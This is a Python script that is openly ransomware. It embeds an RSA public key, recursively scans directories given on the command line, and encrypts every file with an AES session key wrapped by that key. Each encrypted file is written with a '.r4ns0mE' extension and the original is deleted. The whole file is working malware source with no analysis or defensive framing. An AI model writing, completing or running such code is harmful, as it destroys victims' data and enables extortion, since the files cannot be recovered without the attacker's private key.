import base64
from multiprocessing.sharedctypes import Value
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import sys

BASE_KEY = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''

PKEY = base64.b64decode(BASE_KEY)


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            try:
                yield from scanRecurse(entry.path)
            except FileNotFoundError:
                print("skip: " + entry.path)


def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .r4ns0mE and remove original file
    
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    try:
        fileName= dataFile.split(extension)[0]
    except ValueError:
        fileName= dataFile
    finally:
        fileExtension = '.r4ns0mE'
        encryptedFile = fileName + fileExtension
        with open(encryptedFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        os.remove(dataFile)
        return dataFile

if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise ValueError
    pathlist = []
    for item in sys.argv:
        # Check path exists and is directory
        if os.path.isdir(item):
            pathlist.append(os.path.abspath(item))
    print(pathlist)
    
    for dir in pathlist:
        for item in scanRecurse(dir): 
            filePath = Path(item)
            encrypt(filePath, PKEY)